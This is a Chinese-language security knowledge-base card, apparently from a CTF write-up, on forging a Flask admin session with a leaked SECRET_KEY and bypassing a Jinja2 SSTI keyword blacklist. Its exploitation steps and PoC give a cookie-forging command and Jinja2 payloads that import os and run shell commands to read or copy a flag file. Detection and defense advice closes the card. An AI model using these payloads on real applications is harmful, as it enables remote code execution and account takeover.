---
id: web-python-ssti-jinja2-adjacent-literal-flask-session-forge
title: Flask 会话密钥泄露伪造 admin + Jinja2 相邻字符串字面量拼接绕过 SSTI 黑名单
type: scenario
domain: web
path: web/python/ssti
technique: jinja2-adjacent-literal-flask-session-forge
tags:
- python
- flask
- jinja2
- ssti
- session-forgery
- blacklist-bypass
- waf-bypass
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V197
  verified_at: '2026-11-06T23:17:24+08:00'
  notes: 已对照原文及图27-29/50-53核对：密钥S4p3r_6arth_1s_Burning与图28/29一致，诚实大厅无回显与过滤黑名单一致；原文payload因Markdown加粗丢失魔术属性__，知识库正文已还原为合法Jinja2链（g['po''p']['__glo''bals__']['__bu''iltins__']['__imp''ort__']...）并在Flask g上下文实测执行echo hi；诚实大厅attr变体未在目标复跑。
url: /docs/web/python/ssti/web-python-ssti-jinja2-adjacent-literal-flask-session-forge/
draft: false
kb_aliases:
- Jinja2 相邻字符串拼接绕过
- Jinja2 adjacent string literal SSTI
- Flask session 伪造
- flask-session-cookie-manager
- SSTI 关键字黑名单绕过
- 中括号替代点
- attr 过滤器绕 WAF
---

## 一句话结论

Flask 的 session 是签名而非加密的；一旦 `SECRET_KEY` 从页面源码/附件/配置泄露，攻击者可用 flask-session-cookie-manager 重新签出 `{'user':'admin'}` 的会话进入高权页面。若该页面存在 Jinja2 SSTI 且黑名单过滤 `globals`、`builtins`、`os`、`op`、`flag`、`port`、`subclasses`、`class`、`read`、`.` 等关键字，可用 Python/Jinja2 的**相邻字符串字面量拼接**（`'po''p'` 等价 `'pop'`）绕过子串匹配，用 `[]` 替代点、`|attr` 调用属性、`*` 通配读取 flag。

## 原理

- Flask 默认使用 itsdangerous 对 session cookie 做签名，内容本身是 base64 可读的；拿到 `SECRET_KEY` 就能为任意 session 数据生成合法签名，服务端无法区分。
- 密钥泄露面：错误页/403 页源码、前端 JS、`.git`、备份文件、附件 JAR/源码、默认配置。本例密钥 `S4p3r_6arth_1s_Burning` 直接出现在权限不足页面的 HTML 源码中。
- Jinja2 模板表达式就是 Python 表达式；Python 词法分析会把相邻的字符串字面量自动拼接：`'po''p'` 在解析时变成 `'pop'`，`'g''lobals'` 变成 `'globals'`，`'b''uiltins'` 变成 `'builtins'`。因此黑名单按子串匹配 `globals`/`builtins` 时，拆分后的源码不包含这些连续子串，但运行时仍是原关键字。
- 用 `[]` 下标访问替代 `.` 属性访问，绕过对点号的过滤；用 `|attr('...')` 在不能使用点时调用属性；用 `*` 通配（如 `cat /f*`）绕过对 `flag` 文件名的过滤。
- 典型链：`g['po''p']['__glo''bals__']['__bu''iltins__']['__imp''ort__']('o''s')['po''pen']('cat /f*')['r''ead']()`——原文网页渲染时把魔术属性两侧的 `__` 当作 Markdown 加粗标记吞掉（正文显示为 `g['po''p']['g''lobals']...'imp''ort'...`），该残缺形式不是合法 Jinja2；本卡已按 Jinja2 相邻字符串字面量规则还原下划线，并已在 Flask `g` 上下文实测可执行。若模板引擎不是 Jinja2（如 Twig、Thymeleaf），相邻字面量规则不适用。
- 第二例把命令输出写到 Web 静态目录：先 `mkdir /app/static`，再 `cat /flag>/app/static/flag`，最后直接访问 `/static/flag`，避免无回显的限制。

## 触发条件

- Flask 应用使用默认 session 机制，`SECRET_KEY` 可从源码/页面/附件/配置中获取。
- 存在用户输入被 `render_template_string`/模板拼接渲染的 SSTI 点，且只做了关键字黑名单（未做沙箱/白名单）。
- 黑名单按连续子串匹配，未规范化引号/拼接/属性访问。
- 攻击者可访问应用并携带自定义 session cookie；SSTI 点可通过伪造的 admin 会话进入。
- 目标文件系统可读 flag，或 Web 目录可写（用于无回显外带）。

## 利用步骤

1. 获取 Flask `SECRET_KEY`：查看 403/错误页源码、前端 JS、附件源码、备份文件；本例在“权限不足”页面 HTML 中以 `key:...` 形式泄露。
2. 用 flask-session-cookie-manager 伪造 admin 会话：

```bash
python flask_session_cookie_manager3.py encode -s '<SECRET_KEY>' -t "{'user':'admin'}"
```

3. 将生成的 cookie 替换到请求中，访问需要管理员权限的 SSTI 页面。
4. 确认 SSTI 与黑名单：回显型模板先测 `{{8*8}}` 是否返回 64（本例“诚实大厅”无回显，只能靠过滤响应/写文件结果判断）；再测 `{{''.__class__}}` 是否被拦截，记录被 ban 的关键字。
5. 构造绕过 payload（相邻字面量 + 中括号/attr + 通配）：

```jinja
{{g['po''p']['__glo''bals__']['__bu''iltins__']['__imp''ort__']('o''s')['po''pen']('cat /f*')['r''ead']()}}
```

6. 若页面过滤 `request`/内存马，改用 `|attr` 链并直接把 flag 写入静态目录：

```jinja
{{(((((x|attr('__init__')|attr('__gl''obals__')|attr('__getitem__'))('__bu''iltins__')|attr('__getitem__'))('__im''port__'))('o''s')|attr('popen'))('cat /flag>/app/static/flag')|attr('read'))()}}
```

7. 访问 `/static/flag` 下载结果；若仍无回显，尝试 DNS/HTTP 外带或写文件到可访问目录。
8. 授权测试中使用测试 secret/测试 flag，不读取真实凭据；测试后轮换密钥。

## PoC

```bash
# 1) 伪造 Flask session（密钥来自页面源码）
python flask_session_cookie_manager3.py encode -s 'S4p3r_6arth_1s_Burning' -t "{'user':'admin'}"
# 输出形如 eyJ1c2VyIjoiYWRtaW4ifQ....

# 2) 携带 cookie 访问 SSTI 页面；回显型先测试回显
?name={{8*8}}          -> 64

# 3) 黑名单绕过（相邻字符串字面量 + 中括号；原文渲染丢失的 __ 已还原）
{{g['po''p']['__glo''bals__']['__bu''iltins__']['__imp''ort__']('o''s')['po''pen']('cat /f*')['r''ead']()}}

# 4) 无回显写静态目录
{{(((((x|attr('__init__')|attr('__gl''obals__')|attr('__getitem__'))('__bu''iltins__')|attr('__getitem__'))('__im''port__'))('o''s')|attr('popen'))('cat /flag>/app/static/flag')|attr('read'))()}}
```

原文两个挑战（“我是复读机”“诚实大厅”）分别用上述 session 伪造 + 黑名单绕过拿到 flag；本卡未在本库复跑，不同 Jinja2 版本/沙箱的表达式解析可能有差异。

## 变体与关联

- 密钥来源变体：源码/错误页、`.git`、备份文件、JAR/二进制硬编码、默认配置（参见 `web-generic-jwt-example-config-hardcoded-secret` 类思路，但 Flask session 不同）。
- 绕过变体：`dict(...)|join` 动态拼关键字（`web-python-ssti-jinja2-dict-join-keyword-construction`）；`chr()` 拼关键字（`web-python-ssti-jinja2-context-doc-get-chr-keyword-bypass`）；`|attr`、`[]`、相邻字面量、Unicode/编码混淆。
- 执行变体：`os.popen`、`subprocess.Popen`、`__import__('os')`、Jinja2 沙箱逃逸（`__subclasses__`）；无回显时写静态目录/外带。
- 关联卡：Flask+Node 多组件链 SSTI（`ctf-web-flask-node-file-read-prototype-pollution-ssti-chain`）；Jinja2 上下文读取（`web-python-ssti-jinja2-context-doc-get-chr-keyword-bypass`）。
- 边界：相邻字面量拼接是 Python 语法特性；若模板引擎不是 Python/Jinja2（如 Twig、Thymeleaf），需用对应语言的字符串拼接方式。

## 检测与防御

- 密钥管理：`SECRET_KEY` 使用高强度随机值，存放在环境变量/密钥管理服务，不写入源码、前端、错误页、备份或镜像；定期轮换；泄露后立即失效所有会话。
- 模板安全：不要把用户输入拼进模板源码；使用 `render_template` + 固定模板；对必须动态渲染的场景使用沙箱（Jinja2 SandboxedEnvironment）并限制可用属性/函数。
- 黑名单无效：关键字黑名单容易被拼接/编码/属性访问绕过；改用白名单/上下文隔离/禁用危险全局。
- 输出与行为检测：监控模板中的 `__globals__`、`__builtins__`、`popen`、`subprocess`、`attr` 等模式（需结合编码/拼接规范化）；对异常 session 签名/角色变化告警。
- 权限：管理员页面必须服务端校验角色；不要仅依赖 session 中的 `user` 字段；对敏感操作二次认证。
